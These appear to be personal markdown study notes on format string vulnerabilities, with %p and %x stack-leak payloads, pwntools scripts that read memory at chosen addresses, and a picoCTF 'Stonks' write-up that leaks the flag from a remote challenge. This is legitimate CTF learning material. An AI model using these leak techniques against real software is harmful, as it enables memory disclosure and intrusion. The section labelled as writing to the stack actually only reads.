## Format String vulnerability

### Resources
> A simple Format String exploit example - bin 0x11 (LiveOverflow)  
> https://www.youtube.com/watch?v=0WvrSfcdq1I  

### Format String
> https://ir0nstone.gitbook.io/notes/types/stack/format-string  
> https://codeforwin.org/2015/05/list-of-all-format-specifiers-in-c-programming.html  

### Indentifying a format string vulnerability

Look for Any printf function that takes your input thats first and only parameter.

Using the %p allows you to enumerate the addresses on the stack.

### Finding the index of the user input of the stack

Using the %p multiple times until you can identify your exact offset of your index.

Example:

```
./vuln

AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p

We can see in the below result that index #6 is the offset of where our A's are.

AAAA 0xf63d4e2e 0xfff359a0 0x804918c 0xfff35a34 0xf7f33470 0x41414141 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520
```

Extracting the exact offset for the index selected

```
./vuln

%6$p

Confirming the offset by reading the user input

AAAA %6$p
```

### Writing to the stack

Retrieving the base address

```
readelf --all auth
0x08048000 base address of vuln
```

```python
from pwn import *

p = process("./vuln")
base_addr = p32(0x08048000)

buf = b"" 
buf += b"%7$p" + base_addr

p.sendline(buf)
p.interactive()
```

### Reading the value at the address

```
readelf --all auth
0x08048000 base address of vuln
```

```python
from pwn import *

p = process("./vuln")
base_addr = p32(0x08048000)

buf = b"" 
buf += b"%7$s" + base_addr

p.sendline(buf)
p.interactive()
```


------------------------------------------------

### picoCTF Stonks (Format String Vuln)

Thanks to @iilegacyyii for helping me learn the automation aspect of the exploitation

### format string vulnerability to leak flag data

I confirmed the vulnerability by locating the weakness in the code by entering `%x` into user input to leak addresses from the stack. A particular set of bytes contained the flag.  

`scanf("%300s", user_buf);`

To confirm this, i was able to compile the source code and replicate the flag by creating a file named api and creating a random string named "this is a test".

```bash
# ./x 
Welcome back to the trading app!
                                                          
What would you like to do?
1) Buy some stonks!
2) View my portfolio
1            
Using patented AI algorithms to buy stonks
Stonks chosen    
What is your API token?
%x                
Buying stonks with token:
566737f0
```

```python
from pwn import *
from Crypto.Util.number import long_to_bytes

#p = process("./x")
p = remote("<picoctfdomain>", <port>)
fuzz = "%x"*30

p.sendline("1")
p.recvuntil("?")
p.sendline(fuzz)
print("===========")
p.recvuntil("token:\n")
leakdata = p.recvuntil("\n").strip("\n")
leakdata = int(leakdata, 16)
leakdata = long_to_bytes(leakdata)

# Manually entered payload after retrieving it.
x = 'ocip{FTC0l_I4_t5m_ll0m_y_y3n2fc10a10'
result = ""
for i in range(0, len(x), 4):
  result += x[i:i+4][::-1]
print(result)

print("===============")
print(leakdata)

p.interactive()
```

